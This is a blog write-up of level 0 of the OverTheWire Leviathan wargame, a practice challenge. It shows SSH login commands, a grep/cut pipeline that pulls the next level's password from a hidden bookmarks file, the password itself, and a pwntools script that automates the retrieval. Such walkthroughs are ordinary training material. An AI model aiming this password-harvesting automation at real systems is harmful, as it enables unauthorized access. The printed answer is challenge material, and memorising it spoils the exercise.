---
title: OverTheWire - Leviathan w/ pwntools
description: OTW leviathan writeup with pwntools.
categories:
 - overthewire
tags: overthewire pwntools linux ssh
---

![](https://images3.alphacoders.com/605/thumb-1920-605494.jpg)

Hi all, let's pwn it!

You can find the challenge there > [OverTheWire Leviathan](https://overthewire.org/wargames/leviathan/){:target="_blank"}

## Level 0

Let's connect first to the server, default creds for level 0 are `leviathan0:leviathan0`:

```
$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0@leviathan:~$
```

We can see a hidden `.backup` file:

```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

In this there is a bookmarks.html file, probably password is in it.

```
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
```

File has lot of contents, i'll use linux filtering to grab just the password:

```
leviathan0@leviathan:~/.backup$ wc -l -c bookmarks.html 
  1399 133259 bookmarks.html
```

```
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep password | cut -d ' ' -f 14 | cut -c1-10
rioGegei8m
```

If you have no idea what `cut` command does, i suggest you to study about it.

My pwntools exploit (add 2 backslashes between the space delimiter):

```python
#!/usr/bin/env python3
#context.log_level = 'debug'

from pwn import *

log.info('leviathan series pwntools exploit by atom')
shell = ssh('leviathan0', 'leviathan.labs.overthewire.org', password='leviathan0', port=2223)
sh = shell.run('sh')
sh.sendline('cd .backup; cat bookmarks.html | grep password | cut -d ' ' -f 14 | cut -c1-10')
log.success("Password for the next level -> " + sh.recvline().decode("utf-8"))
```

```
$ ./exp.py 
[*] leviathan series pwntools exploit by atom
[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
[*] leviathan0@leviathan.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Opening new channel: 'sh': Done
[+] Password for the next level -> $ rioGegei8m
```

## Level 1
